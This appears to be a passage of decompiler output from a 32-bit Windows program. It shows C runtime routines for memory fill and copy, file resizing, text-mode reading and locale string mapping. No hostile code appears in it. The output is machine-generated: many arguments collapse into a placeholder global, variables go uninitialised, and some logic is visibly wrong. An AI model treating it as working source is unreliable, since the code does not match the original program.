    v13 = v5 & 3;
    if (v13 == 0) {
        // 0x405942
        return result;
    }
    goto lab_0x405935;
  lab_0x40596e:;
    int32_t v29 = v26 - 1; // 0x40596e
    int32_t v30 = v29; // 0x40596f
    int32_t v31 = v27; // 0x40596f
    if (v29 == 0) {
        // 0x405942
        return result;
    }
    goto lab_0x40596b;
  lab_0x40596b:
    // 0x40596b
    *(char *)v31 = 0;
    v26 = v30;
    v27 = v31 + 1;
    goto lab_0x40596e;
  lab_0x405964:
    // 0x405964
    v30 = v7;
    v31 = v10;
    if (v7 >= 4) {
        goto lab_0x4059d7;
    } else {
        goto lab_0x40596b;
    }
  lab_0x405952:
    // 0x405952
    *(char *)v9 = 0;
    int32_t v32 = v6 - 1; // 0x405955
    if (v32 == 0) {
        goto lab_0x405942;
    } else {
        int32_t v33 = v9 + 1; // 0x405954
        v6 = v32;
        v9 = v33;
        v7 = v32;
        v10 = v33;
        if ((v33 & 3) != 0) {
            goto lab_0x405952;
        } else {
            goto lab_0x405964;
        }
    }
  lab_0x4059d7:;
    int32_t v34 = v7 / 4; // 0x4059d7
    int32_t v35 = v10; // 0x4059d7
    goto lab_0x4059d9;
  lab_0x4059d9:
    // 0x4059d9
    *(int32_t *)v35 = 0;
    int32_t v36 = v35 + 4; // 0x4059db
    int32_t v37 = v34 - 1; // 0x4059de
    v34 = v37;
    v35 = v36;
    int32_t v38 = v36; // 0x4059df
    if (v37 != 0) {
        goto lab_0x4059d9;
    } else {
        goto lab_0x4059e1;
    }
  lab_0x4059e1:;
    int32_t v39 = v7 & 3; // 0x4059e1
    v30 = v39;
    v31 = v38;
    if (v39 != 0) {
        goto lab_0x40596b;
    } else {
        goto lab_0x405942;
    }
  lab_0x4059cf:
    // 0x4059cf
    v38 = v15 + 4;
    int32_t v40; // 0x4058f0
    if (v40 == 1) {
        goto lab_0x4059e1;
    } else {
        goto lab_0x4059d7;
    }
}

// Address range: 0x4059ee - 0x405a09
int32_t __callnewh(int32_t a1) {
    // 0x4059ee
    return g74 != 0;
}

// Address range: 0x405a09 - 0x405a12
int32_t function_405a09(void) {
    // 0x405a09
    return __amsg_exit();
}

// Address range: 0x405a20 - 0x405a78
int32_t function_405a20(int32_t result, int32_t a2, int32_t a3) {
    // 0x405a20
    if (a3 == 0) {
        // 0x405a6d
        return result;
    }
    int32_t v1 = a2 & 255;
    int32_t v2 = v1; // 0x405a38
    int32_t v3 = a3; // 0x405a38
    int32_t v4 = result; // 0x405a38
    if (a3 >= 4) {
        int32_t v5 = -result & 3; // 0x405a3c
        int32_t v6 = a3; // 0x405a3f
        int32_t v7 = result; // 0x405a3f
        if (v5 != 0) {
            int32_t v8 = v5; // 0x405a41
            *(char *)result = (char)a2;
            int32_t v9 = result + 1; // 0x405a45
            v8--;
            int32_t v10 = v9; // 0x405a47
            while (v8 != 0) {
                // 0x405a43
                *(char *)v10 = (char)a2;
                v9 = v10 + 1;
                v8--;
                v10 = v9;
            }
            // 0x405a49
            v6 = a3 - v5;
            v7 = v9;
        }
        int32_t v11 = 0x1010101 * v1; // 0x405a55
        int32_t v12 = v6 & 3; // 0x405a59
        v2 = v11;
        v3 = v12;
        v4 = v7;
        if (v6 >= 4) {
            uint32_t v13 = v6 / 4; // 0x405a5c
            __asm_rep_stosd_memset((char *)v7, v11, v13);
            v2 = v11;
            v3 = v12;
            bool v14; // 0x405a20
            v4 = v13 * (v14 ? -4 : 4) + v7;
            if (v12 == 0) {
                // 0x405a6d
                return result;
            }
        }
    }
    int32_t v15 = v3; // 0x405a6a
    int32_t v16 = v4; // 0x405a20
    *(char *)v16 = (char)v2;
    v15--;
    v16++;
    while (v15 != 0) {
        // 0x405a67
        *(char *)v16 = (char)v2;
        v15--;
        v16++;
    }
    // 0x405a6d
    return result;
}

// Address range: 0x405a80 - 0x405db5
int32_t function_405a80(int32_t a1, int32_t result5, uint32_t a3, uint32_t a4) {
    int32_t result3 = a4 + a3; // 0x405a92
    int32_t v1; // 0x405a80
    int32_t v2; // 0x405a80
    int32_t v3; // 0x405a80
    int32_t v4; // 0x405a80
    int32_t v5; // 0x405a80
    int32_t result6; // 0x405a80
    int32_t v6; // 0x405a80
    int32_t v7; // 0x405a80
    int32_t v8; // 0x405a80
    int32_t v9; // 0x405a80
    int32_t v10; // 0x405a80
    int32_t v11; // 0x405a80
    int32_t result2; // 0x405a80
    int32_t result; // 0x405a80
    if (result5 > a3 == result3 > result5) {
        int32_t v12 = a4 - 4; // 0x405c18
        int32_t v13 = v12 + a3; // 0x405c18
        int32_t v14 = v12 + result5; // 0x405c1c
        int32_t v15 = v14 & 3; // 0x405c20
        if (v15 != 0) {
            // 0x405c4c
            g109 = a4;
            result2 = v15;
            result = result5;
            v9 = v13;
            v6 = v14;
            v10 = v13;
            v7 = v14;
            v11 = v13;
            v8 = v14;
            switch (a4) {
                case 0: {
                    return result;
                }
                case 1: {
                    goto lab_0x405d78;
                }
                case 2: {
                    goto lab_0x405d88;
                }
                case 3: {
                    goto lab_0x405d9c;
                }
                default: {
                    return result2;
                }
            }
        } else {
            int32_t v16 = -((a4 / 4));
            g108 = v16;
            if (a4 < 4) {
                // 0x405ac8
                return result3;
            }
            int32_t v17 = a4 & 3; // 0x405c2b
            __asm_rep_movsd_memcpy((char *)v14, (char *)v13, v16);
            int32_t v18 = v14 + (a4 & -4); // 0x405c34
            g118 = v17;
            result = result5;
            v9 = v18;
            v6 = v18;
            v10 = v18;
            v7 = v18;
            v11 = v18;
            v8 = v18;
            switch (v17) {
                case 0: {
                    return result;
                }
                case 1: {
                    goto lab_0x405d78;
                }
                case 2: {
                    goto lab_0x405d88;
                }
                case 3: {
                    goto lab_0x405d9c;
                }
                default: {
                    // 0x405c402
                    // UNREACHABLE
                }
            }
        }
    } else {
        int32_t result4 = result5 & 3; // 0x405aa0
        if (result4 != 0) {
            // 0x405abc
            result = result5;
            if (a4 >= 4) {
                // 0x405ac8
                return result4;
            }
            // 0x405ac8
            return result;
        }
        int32_t v19 = a4 / 4; // 0x405aa8
        g117 = v19;
        result = result3;
        switch (v19) {
            case 0: {
                return result;
            }
            case 1: {
                // 0x405aa8
                result6 = a4 & -4;
                goto lab_0x405bac;
            }
            case 2: {
                // 0x405aa8
                v3 = a4 & -4;
                goto lab_0x405ba4;
            }
            case 3: {
                // 0x405aa8
                v4 = a4 & -4;
                goto lab_0x405b9c;
            }
            case 4: {
                // 0x405aa8
                v5 = a4 & -4;
                goto lab_0x405b94;
            }
            case 5: {
                // 0x405aa8
                v1 = a4 & -4;
                goto lab_0x405b8c;
            }
            case 6: {
                // 0x405aa8
                v2 = a4 & -4;
                goto lab_0x405b84;
            }
            case 7: {
                int32_t v20 = a4 & -4;
                int32_t v21 = v20 - 28;
                *(int32_t *)(v21 + result5) = *(int32_t *)(v21 + a3);
                v2 = v20;
                goto lab_0x405b84;
            }
            default: {
                int32_t v22 = a4 & 3; // 0x405aab
                __asm_rep_movsd_memcpy((char *)result5, (char *)a3, v19);
                g116 = v22;
                result2 = result5;
                if (v22 < 2) {
                    // 0x405ac8
                    return result5;
                }
                // 0x405ac8
                return result2;
            }
        }
    }
  lab_0x405d78:
    // 0x405d78
    *(char *)(v6 + 3) = *(char *)(v9 + 3);
    return result5;
  lab_0x405d88:
    // 0x405d88
    *(char *)(v7 + 3) = *(char *)(v10 + 3);
    *(char *)(v7 + 2) = *(char *)(v10 + 2);
    return result5;
  lab_0x405d9c:
    // 0x405d9c
    *(char *)(v8 + 3) = *(char *)(v11 + 3);
    *(char *)(v8 + 2) = *(char *)(v11 + 2);
    *(char *)(v8 + 1) = *(char *)(v11 + 1);
    return result5;
  lab_0x405bac:;
    int32_t v23 = result6 - 4;
    *(int32_t *)(v23 + result5) = *(int32_t *)(v23 + a3);
    // 0x405ac8
    return result6;
  lab_0x405ba4:;
    int32_t v24 = v3 - 8;
    *(int32_t *)(v24 + result5) = *(int32_t *)(v24 + a3);
    result6 = v3;
    goto lab_0x405bac;
  lab_0x405b9c:;
    int32_t v25 = v4 - 12;
    *(int32_t *)(v25 + result5) = *(int32_t *)(v25 + a3);
    v3 = v4;
    goto lab_0x405ba4;
  lab_0x405b94:;
    int32_t v26 = v5 - 16;
    *(int32_t *)(v26 + result5) = *(int32_t *)(v26 + a3);
    v4 = v5;
    goto lab_0x405b9c;
  lab_0x405b8c:;
    int32_t v27 = v1 - 20;
    *(int32_t *)(v27 + result5) = *(int32_t *)(v27 + a3);
    v5 = v1;
    goto lab_0x405b94;
  lab_0x405b84:;
    int32_t v28 = v2 - 24;
    *(int32_t *)(v28 + result5) = *(int32_t *)(v28 + a3);
    v1 = v2;
    goto lab_0x405b8c;
}

// Address range: 0x405db5 - 0x405efb
int32_t function_405db5(uint32_t a1, int32_t a2) {
    // 0x405db5
    int32_t v1; // 0x405db5
    function_405830(v1);
    if ((int32_t)g98 <= a1) {
        // 0x405eea
        g49 = 9;
        // 0x405ef7
        return -1;
    }
    int32_t v2 = *(int32_t *)(4 * a1 / 32 + (int32_t)&g96); // 0x405ddf
    if ((*(char *)(v2 + (8 * a1 & 248 | 4)) & 1) == 0) {
        // 0x405eea
        g49 = 9;
        // 0x405ef7
        return -1;
    }
    int32_t v3 = 1; // bp-16, 0x405df1
    int32_t v4 = 0; // bp-20, 0x405df3
    int32_t v5 = function_404c14(a1, 0, 1); // 0x405df5
    if (v5 == -1) {
        // 0x405ef7
        return -1;
    }
    // 0x405e09
    v3 = 2;
    v4 = 0;
    int32_t v6 = function_404c14(a1, 0, 2); // 0x405e0d
    if (v6 == -1) {
        // 0x405ef7
        return -1;
    }
    int32_t v7 = &v3; // 0x405e1e
    int32_t v8 = a2 - v6; // 0x405e22
    int32_t result; // 0x405db5
    int32_t v9; // 0x405db5
    if (v8 < 1) {
        // 0x405e97
        v9 = v7;
        result = 0;
        if (v8 != 0) {
            // 0x405e99
            function_404c14(a1, a2, 0);
            int32_t hFile = function_404b80(a1); // 0x405ea5
            v4 = hFile;
            int32_t v10 = &v4; // 0x405ead
            bool v11 = SetEndOfFile((int32_t *)hFile); // 0x405eae
            int32_t v12 = !v11; // 0x405ebc
            v9 = v10;
            result = v12;
            if (!v11) {
                // 0x405ec2
                g49 = 13;
                g50 = GetLastError();
                v9 = v10;
                result = v12;
            }
        }
    } else {
        // 0x405e28
        v4 = 0x1000;
        int32_t v13; // bp-4100, 0x405db5
        int32_t v14 = &v13; // 0x405e34
        function_405a20(v14, 0, 0x1000);
        int32_t v15 = function_4065ca(a1, 0x8000); // 0x405e40
        int32_t * v16 = (int32_t *)(v7 - 4);
        int32_t * v17 = (int32_t *)(v7 - 8);
        int32_t v18 = v8;
        *v16 = v18 < 0x1000 ? v18 : 0x1000;
        *v17 = v14;
        *(int32_t *)(v7 - 12) = a1;
        int32_t v19 = function_402302((int32_t)&g110, (int32_t)&g110, (int32_t)&g110); // 0x405e5f
        int32_t v20; // 0x405db5
        while (v19 != -1) {
            int32_t v21 = v18 - v19; // 0x405e6c
            v20 = 0;
            if (v21 < 1) {
                goto lab_0x405e8a;
            }
            v18 = v21;
            *v16 = v18 < 0x1000 ? v18 : 0x1000;
            *v17 = v14;
            *(int32_t *)(v7 - 12) = a1;
            v19 = function_402302((int32_t)&g110, (int32_t)&g110, (int32_t)&g110);
        }
        // 0x405e74
        v20 = -1;
        if (g50 == 5) {
            // 0x405e7d
            g49 = 13;
            v20 = -1;
        }
      lab_0x405e8a:
        // 0x405e8a
        *v16 = v15;
        *v17 = a1;
        function_4065ca((int32_t)&g110, (int32_t)&g110);
        v9 = v7;
        result = v20;
    }
    // 0x405ed7
    *(int32_t *)(v9 - 4) = 0;
    *(int32_t *)(v9 - 8) = v5;
    *(int32_t *)(v9 - 12) = a1;
    function_404c14((int32_t)&g110, (int32_t)&g110, (int32_t)&g110);
    // 0x405ef7
    return result;
}

// Address range: 0x405efb - 0x4060f1
int32_t function_405efb(uint32_t a1, char * a2, int32_t a3) {
    // 0x405efb
    if ((int32_t)g98 <= a1) {
        // 0x4060d8
        g50 = 0;
        g49 = 9;
        // 0x4060ec
        return -1;
    }
    int32_t v1 = 8 * a1 & 248; // 0x405f1b
    int32_t * v2 = (int32_t *)(4 * a1 / 32 + (int32_t)&g96); // 0x405f25
    int32_t v3 = *v2 + v1;
    unsigned char v4 = *(char *)(v3 + 4); // 0x405f2e
    if ((v4 & 1) == 0) {
        // 0x4060d8
        g50 = 0;
        g49 = 9;
        // 0x4060ec
        return -1;
    }
    // 0x405f3a
    if (a3 == 0) {
        // 0x4060ec
        return 0;
    }
    int32_t v5 = v4; // 0x405f2e
    if ((v5 & 2) != 0) {
        // 0x4060ec
        return 0;
    }
    int32_t v6 = (int32_t)a2; // 0x405f3e
    int32_t v7 = v3; // 0x405f51
    int32_t nNumberOfBytesToRead = a3; // 0x405f51
    int32_t v8 = 0; // 0x405f51
    int32_t lpBuffer = v6; // 0x405f51
    if ((v5 & 72) != 0) {
        char v9 = *(char *)(v3 + 5); // 0x405f53
        v7 = v3;
        nNumberOfBytesToRead = a3;
        v8 = 0;
        lpBuffer = v6;
        if (v9 != 10) {
            // 0x405f5a
            *a2 = v9;
            *(char *)(*v2 + (v1 | 5)) = 10;
            v7 = *v2 + v1;
            nNumberOfBytesToRead = (int32_t)(char *)(a3 - 1);
            v8 = 1;
            lpBuffer = v6 + 1;
        }
    }
    int32_t hFile = *(int32_t *)v7; // 0x405f7c
    int32_t v10 = hFile; // bp-48, 0x405f7c
    int32_t lpNumberOfBytesRead; // bp-16, 0x405efb
    bool v11 = ReadFile((int32_t *)hFile, (int32_t *)lpBuffer, nNumberOfBytesToRead, &lpNumberOfBytesRead, NULL); // 0x405f7f
    if (!v11) {
        int32_t errorCode = GetLastError(); // 0x405f89
        if (errorCode == 5) {
            // 0x405f96
            g49 = 9;
            g50 = 5;
            // 0x4060ec
            return -1;
        }
        int32_t result = 0; // 0x405fae
        if (errorCode != 109) {
            // 0x405fb7
            function_404993(errorCode);
            result = -1;
        }
        // 0x4060ec
        return result;
    }
    int32_t result2 = lpNumberOfBytesRead + v8; // 0x405fc8
    int32_t v12 = v1 | 4;
    char * v13 = (char *)(*v2 + v12); // 0x405fcf
    char v14 = *v13; // 0x405fcf
    if (v14 > -1) {
        // 0x4060ec
        return result2;
    }
    char v15; // 0x405efb
    if (lpNumberOfBytesRead == 0) {
        // 0x405fe8
        v15 = v14 & -5;
        goto lab_0x405fea;
    } else {
        // 0x405fdf
        if (*a2 != 10) {
            // 0x405fe8
            v15 = v14 & -5;
            goto lab_0x405fea;
        } else {
            // 0x405fe4
            v15 = v14 | 4;
            goto lab_0x405fea;
        }
    }
  lab_0x4060af:;
    // 0x4060af
    char * v16; // bp+12, 0x405efb
    char * v17 = v16; // 0x4060b5
    int32_t v18; // 0x405efb
    int32_t v19 = v18; // 0x4060b5
    int32_t v20; // 0x405efb
    int32_t v21 = v20; // 0x4060b5
    int32_t v22 = v20; // 0x4060b5
    uint32_t v23; // 0x405ff5
    if (v23 <= (int32_t)v16) {
        // 0x4060ec
        return v22 - v6;
    }
    goto lab_0x406002;
  lab_0x406064:;
    // 0x406064
    int32_t v24; // 0x405efb
    int32_t v34; // 0x405efb
    int32_t v32; // 0x405efb
    char v29; // bp-5, 0x405efb
    int32_t v30; // 0x40604d
    if (lpNumberOfBytesRead == 0) {
        // 0x4060ab
        *(char *)v24 = 13;
        v32 = v30;
        goto lab_0x4060ae;
    } else {
        // 0x40606a
        if ((*(char *)(*v2 + v12) & 72) == 0) {
            if (v24 != v6) {
                goto lab_0x406096;
            } else {
                // 0x40608b
                v34 = v30;
                if (v29 != 10) {
                    goto lab_0x406096;
                } else {
                    goto lab_0x406091;
                }
            }
        } else {
            // 0x406073
            v34 = v30;
            if (v29 == 10) {
                goto lab_0x406091;
            } else {
                // 0x40607a
                *(char *)v24 = 13;
                *(char *)(*v2 + (v1 | 5)) = v29;
                v18 = v30;
                v20 = v24 + 1;
                goto lab_0x4060af;
            }
        }
    }
  lab_0x406091:
    // 0x406091
    *(char *)v24 = 10;
    v32 = v34;
    goto lab_0x4060ae;
  lab_0x4060ae:
    // 0x4060ae
    v18 = v32;
    v20 = v24 + 1;
    goto lab_0x4060af;
  lab_0x406096:;
    // 0x406096
    int32_t v25; // 0x405efb
    *(int32_t *)(v25 - 24) = 1;
    *(int32_t *)(v25 - 28) = -1;
    *(int32_t *)(v25 - 32) = a1;
    function_404c14((int32_t)&g110, (int32_t)&g110, (int32_t)&g110);
    v18 = v30;
    v20 = v24;
    if (v29 == 10) {
        goto lab_0x4060af;
    } else {
        // 0x4060ab
        *(char *)v24 = 13;
        v32 = v30;
        goto lab_0x4060ae;
    }
  lab_0x405fea:
    // 0x405fea
    *v13 = v15;
    v16 = a2;
    v23 = result2 + v6;
    if (v23 <= v6) {
        // 0x4060ec
        return 0;
    }
    // 0x406002
    v17 = a2;
    v19 = &v10;
    v21 = v6;
    while (true) {
      lab_0x406002:
        // 0x406002
        v24 = v21;
        v25 = v19;
        char * v26 = v17; // 0x406002
        char v27 = *v26; // 0x406005
        switch (v27) {
            case 26: {
                goto lab_0x4060bd;
            }
            case 13: {
                uint32_t v28 = (int32_t)v26; // 0x40601f
                if (v23 - 1 <= v28) {
                    // 0x40603c
                    *(int32_t *)(v25 - 4) = 0;
                    *(int32_t *)(v25 - 8) = (int32_t)&lpNumberOfBytesRead;
                    int32_t hFile2 = (int32_t)v16 + 1; // 0x406042
                    v16 = (char *)hFile2;
                    *(int32_t *)(v25 - 12) = 1;
                    *(int32_t *)(v25 - 16) = (int32_t)&v29;
                    v30 = v25 - 20;
                    *(int32_t *)v30 = *(int32_t *)(*v2 + v1);
                    bool v31 = ReadFile((int32_t *)hFile2, &g110, (int32_t)&g110, &g110, (struct _OVERLAPPED *)&g110); // 0x406050
                    if (v31) {
                        goto lab_0x406064;
                    } else {
                        // 0x40605a
                        if (GetLastError() != 0) {
                            // 0x4060ab
                            *(char *)v24 = 13;
                            v32 = v30;
                            goto lab_0x4060ae;
                        } else {
                            goto lab_0x406064;
                        }
                    }
                } else {
                    char * v33 = (char *)(v28 + 1); // 0x406028
                    if (*v33 != 10) {
                        // 0x406033
                        *(char *)v24 = 13;
                        v16 = v33;
                        v18 = v25;
                        v20 = v24 + 1;
                        goto lab_0x4060af;
                    } else {
                        // 0x40602d
                        v16 = (char *)(v28 + 2);
                        v34 = v25;
                        goto lab_0x406091;
                    }
                }
            }
            default: {
                // 0x406013
                *(char *)v24 = v27;
                v16 = (char *)((int32_t)v16 + 1);
                v18 = v25;
                v20 = v24 + 1;
                goto lab_0x4060af;
            }
        }
    }
  lab_0x4060bd:;
    char * v35 = (char *)(*v2 + v12); // 0x4060c3
    char v36 = *v35; // 0x4060c3
    if ((v36 & 64) == 0) {
        // 0x4060c9
        *v35 = v36 | 2;
    }
    // 0x4060ec
    return v24 - v6;
}

// Address range: 0x4060f1 - 0x406315
int32_t function_4060f1(int32_t a1, int32_t a2, char * a3, int32_t a4, int32_t * a5, int32_t a6, int32_t a7, int32_t a8, int32_t a9) {
    int32_t v1 = __readfsdword(0); // bp-20, 0x406106
    __writefsdword(0, (int32_t)&v1);
    int32_t v2 = g78; // 0x40611f
    int32_t v3; // bp-60, 0x4060f1
    int32_t * v4 = &v3; // 0x40611f
    if (g78 == 0) {
        int32_t v5 = 0; // bp-84, 0x406132
        if (LCMapStringW(0, 256, (int16_t *)&g3, 1, NULL, 0) == 0) {
            int32_t v6 = 0; // bp-108, 0x40614e
            if (LCMapStringA(0, 256, (char *)&g2, 1, NULL, 0) == 0) {
                // 0x406281
                __writefsdword(0, v1);
                return 0;
            }
            // 0x40615d
            g78 = 2;
            v2 = 2;
            v4 = &v6;
        } else {
            // 0x40613d
            g78 = 1;
            v2 = 1;
            v4 = &v5;
        }
    }
    int32_t v7 = (int32_t)a5;
    int32_t v8 = (int32_t)v4;
    int32_t v9 = v2; // 0x40616a
    int32_t v10 = v7; // 0x40616a
    if (a5 > NULL) {
        // 0x40616c
        *(int32_t *)(v8 - 4) = v7;
        *(int32_t *)(v8 - 8) = a4;
        v10 = function_406315((int32_t)&g110, (int32_t)&g110);
        v9 = g78;
    }
    // 0x40617c
    if (v9 == 2) {
        // 0x406186
        *(int32_t *)(v8 - 4) = a7;
        *(int32_t *)(v8 - 8) = a6;
        *(int32_t *)(v8 - 12) = v10;
        *(int32_t *)(v8 - 16) = a4;
        *(int32_t *)(v8 - 20) = a2;
        *(int32_t *)(v8 - 24) = a1;
        int32_t result = LCMapStringA((int32_t)&g110, (int32_t)&g110, (char *)&g110, (int32_t)&g110, (char *)&g110, (int32_t)&g110); // 0x406198
        // 0x406281
        __writefsdword(0, v1);
        return result;
    }
    // 0x4061a3
    if (v9 != 1) {
        // 0x406281
        __writefsdword(0, v1);
        return 0;
    }
    int32_t v11 = a8 != 0 ? a8 : g76;
    *(int32_t *)(v8 - 4) = 0;
    *(int32_t *)(v8 - 8) = 0;
    *(int32_t *)(v8 - 12) = v10;
    *(int32_t *)(v8 - 16) = a4;
    *(int32_t *)(v8 - 20) = a9 == 0 ? 1 : 9;
    int32_t v12 = v8 - 24; // 0x4061cd
    *(int32_t *)v12 = v11;
    int32_t v13 = MultiByteToWideChar((int32_t)&g110, (int32_t)&g110, (char *)&g110, (int32_t)&g110, (int16_t *)&g110, (int32_t)&g110); // 0x4061d0
    if (v13 == 0) {
        // 0x406281
        __writefsdword(0, v1);
        return 0;
    }
    // 0x4061e3
    function_405830(v13);
    if (v12 == 0) {
        // 0x406281
        __writefsdword(0, v1);
        return 0;
    }
    // 0x406219
    *(int32_t *)(v8 - 28) = v13;
    *(int32_t *)(v8 - 32) = v12;
    *(int32_t *)(v8 - 36) = v10;
    *(int32_t *)(v8 - 40) = a4;
    *(int32_t *)(v8 - 44) = 1;
    *(int32_t *)(v8 - 48) = v11;
    int32_t v14 = MultiByteToWideChar((int32_t)&g110, (int32_t)&g110, (char *)&g110, (int32_t)&g110, (int16_t *)&g110, (int32_t)&g110); // 0x406228
    if (v14 == 0) {
        // 0x406281
        __writefsdword(0, v1);
        return 0;
    }
    // 0x406232
    *(int32_t *)(v8 - 52) = 0;
    *(int32_t *)(v8 - 56) = 0;
    *(int32_t *)(v8 - 60) = v13;
    *(int32_t *)(v8 - 64) = v12;
    *(int32_t *)(v8 - 68) = a2;
    int32_t v15 = v8 - 72; // 0x40623b
    *(int32_t *)v15 = a1;
    int32_t Locale = LCMapStringW((int32_t)&g110, (int32_t)&g110, (int16_t *)&g110, (int32_t)&g110, (int16_t *)&g110, (int32_t)&g110); // 0x40623e
    if (Locale == 0) {
        // 0x406281
        __writefsdword(0, v1);
        return 0;
    }
    int32_t result2; // 0x4060f1
    if (((int32_t)a3 & 4) == 0) {
        // 0x406293
        function_405830(Locale);
        if (v15 == 0) {
            // 0x406281
            __writefsdword(0, v1);
            return 0;
        }
        // 0x4062cb
        *(int32_t *)(v8 - 76) = Locale;
        *(int32_t *)(v8 - 80) = v15;
        *(int32_t *)(v8 - 84) = v13;
        *(int32_t *)(v8 - 88) = v12;
        *(int32_t *)(v8 - 92) = a2;
        *(int32_t *)(v8 - 96) = a1;
        int32_t v16 = LCMapStringW((int32_t)&g110, (int32_t)&g110, (int16_t *)&g110, (int32_t)&g110, (int16_t *)&g110, (int32_t)&g110); // 0x4062d9
        if (v16 == 0) {
            // 0x406281
            __writefsdword(0, v1);
            return 0;
        }
        // 0x4062e3
        *(int32_t *)(v8 - 100) = 0;
        *(int32_t *)(v8 - 104) = 0;
        int32_t * v17 = (int32_t *)(v8 - 108);
        int32_t v18; // 0x4060f1
        if (a7 != 0) {
            // 0x4062ee
            *v17 = a7;
            int32_t v19 = v8 - 112; // 0x4062f1
            *(int32_t *)v19 = a6;
            v18 = v19;
        } else {
            // 0x4062ea
            *v17 = 0;
            int32_t v20 = v8 - 112; // 0x4062eb
            *(int32_t *)v20 = 0;
            v18 = v20;
        }
        // 0x4062f4
        *(int32_t *)(v18 - 4) = Locale;
        *(int32_t *)(v18 - 8) = v15;
        *(int32_t *)(v18 - 12) = 544;
        *(int32_t *)(v18 - 16) = v11;
        int32_t v21 = WideCharToMultiByte((int32_t)&g110, (int32_t)&g110, (int16_t *)&g110, (int32_t)&g110, (char *)&g110, (int32_t)&g110, (char *)&g110, (bool *)&g110); // 0x4062fe
        result2 = v21;
        if (v21 == 0) {
            // 0x406281
            __writefsdword(0, v1);
            return 0;
        }
    } else {
        // 0x406253
        result2 = Locale;
        if (a7 != 0) {
            // 0x40625c
            if (Locale > a7) {
                // 0x406281
                __writefsdword(0, v1);
                return 0;
            }
            // 0x406261
            *(int32_t *)(v8 - 76) = a7;
            *(int32_t *)(v8 - 80) = a6;
            *(int32_t *)(v8 - 84) = v13;
            *(int32_t *)(v8 - 88) = v12;
            *(int32_t *)(v8 - 92) = a2;
            *(int32_t *)(v8 - 96) = a1;
            int32_t v22 = LCMapStringW(Locale, (int32_t)&g110, (int16_t *)&g110, (int32_t)&g110, (int16_t *)&g110, (int32_t)&g110); // 0x406271
            result2 = Locale;
            if (v22 == 0) {
                // 0x406281
                __writefsdword(0, v1);
                return 0;
            }
        }
    }
    // 0x406281
    __writefsdword(0, v1);
    return result2;
}

// Address range: 0x406315 - 0x406340
int32_t function_406315(int32_t a1, int32_t result) {
    int32_t v1 = a1; // 0x406323
    int32_t v2 = result; // 0x406323
    int32_t v3 = a1; // 0x406323
    if (result != 0) {
        v3 = v1;
        while (*(char *)v1 != 0) {
            // 0x40632a
            v2--;
            v1++;
            v3 = v1;
            if (v2 == 0) {
                // break -> 0x406332
                break;
            }
            v3 = v1;
        }
    }
    // 0x406332
    if (*(char *)v3 != 0) {
        // 0x40633d
        return result;
    }
    // 0x406338
    return v3 - a1;
}

// Address range: 0x406340 - 0x406489
int32_t function_406340(int32_t a1, char * a2, int32_t a3, int32_t * a4, int32_t a5, int32_t a6, int32_t a7) {
    int32_t v1 = __readfsdword(0); // bp-20, 0x406355
    __writefsdword(0, (int32_t)&v1);
    int32_t v2 = g79; // 0x40636f
    int32_t v3; // bp-56, 0x406340
    int32_t * v4 = &v3; // 0x40636f
    if (g79 == 0) {
        int32_t v5 = 1; // bp-72, 0x40637e
        int32_t lpCharType; // bp-32, 0x406340
        bool v6 = GetStringTypeW(1, (int16_t *)&g3, 1, (int16_t *)&lpCharType); // 0x40637f
        int32_t v7 = 1; // 0x406387
        v4 = &v5;
        if (!v6) {
            int32_t v8 = 0; // bp-92, 0x406398
            bool v9 = GetStringTypeA(0, 1, (char *)&g2, 1, (int16_t *)&lpCharType); // 0x406399
            v7 = 2;
            v4 = &v8;
            if (!v9) {
                // 0x406477
                __writefsdword(0, v1);
                return 0;
            }
        }
        // 0x4063aa
        v2 = v7;
        g79 = v2;
    }
    int32_t v10 = (int32_t)a4;
    int32_t v11 = (int32_t)v4;
    if (v2 == 2) {
        // 0x4063b4
        *(int32_t *)(v11 - 4) = v10;
        *(int32_t *)(v11 - 8) = a3;
        *(int32_t *)(v11 - 12) = (int32_t)a2;
        *(int32_t *)(v11 - 16) = a1;
        *(int32_t *)(v11 - 20) = a6 != 0 ? a6 : g75;
        bool result = GetStringTypeA((int32_t)&g110, (int32_t)&g110, (char *)&g110, (int32_t)&g110, (int16_t *)&g110); // 0x4063cd
        // 0x406477
        __writefsdword(0, v1);
        return result;
    }
    // 0x4063d8
    if (v2 != 1) {
        // 0x406477
        __writefsdword(0, v1);
        return 0;
    }
    int32_t v12 = a5 != 0 ? a5 : g76;
    *(int32_t *)(v11 - 4) = 0;
    *(int32_t *)(v11 - 8) = 0;
    *(int32_t *)(v11 - 12) = a3;
    int32_t v13 = (int32_t)a2; // 0x4063f3
    *(int32_t *)(v11 - 16) = v13;
    *(int32_t *)(v11 - 20) = a7 == 0 ? 1 : 9;
    int32_t v14 = v11 - 24; // 0x406402
    *(int32_t *)v14 = v12;
    int32_t v15 = MultiByteToWideChar((int32_t)&g110, (int32_t)&g110, (char *)&g110, (int32_t)&g110, (int16_t *)&g110, (int32_t)&g110); // 0x406405
    if (v15 == 0) {
        // 0x406477
        __writefsdword(0, v1);
        return 0;
    }
    // 0x406412
    function_405830(v15);
    int32_t * v16 = (int32_t *)(v11 - 28); // 0x40642c
    *v16 = 2 * v15;
    int32_t * v17 = (int32_t *)(v11 - 32); // 0x40642d
    *v17 = 0;
    int32_t * v18 = (int32_t *)(v11 - 36); // 0x40642e
    *v18 = v14;
    function_405a20(v14, (int32_t)&g110, (int32_t)&g110);
    if (v14 == 0) {
        // 0x406477
        __writefsdword(0, v1);
        return 0;
    }
    // 0x40644c
    *v16 = v15;
    *v17 = v14;
    *v18 = a3;
    *(int32_t *)(v11 - 40) = v13;
    *(int32_t *)(v11 - 44) = 1;
    *(int32_t *)(v11 - 48) = v12;
    int32_t v19 = MultiByteToWideChar(-1, (int32_t)&g110, (char *)&g110, (int32_t)&g110, (int16_t *)&g110, (int32_t)&g110); // 0x40645b
    int32_t result2 = 0; // 0x406463
    if (v19 != 0) {
        // 0x406465
        *(int32_t *)(v11 - 52) = v10;
        *(int32_t *)(v11 - 56) = v19;
        *(int32_t *)(v11 - 60) = v14;
        *(int32_t *)(v11 - 64) = a1;
        bool v20 = GetStringTypeW((int32_t)&g110, (int16_t *)&g110, (int32_t)&g110, (int16_t *)&g110); // 0x40646d
        result2 = v20;
    }
    // 0x406477
    __writefsdword(0, v1);
    return result2;
}

// Address range: 0x406489 - 0x406555
int32_t function_406489(int32_t result, int32_t a2, int32_t a3) {
    int32_t v1 = result;
    if (g75 == 0) {
        // 0x406497
        return result > 122 ? result : result - 32;
    }
    int32_t v2 = g75; // 0x4064bd
    if (result <= 255) {
        // 0x4064bf
        int32_t v3; // 0x406489
        if (g44 < 2) {
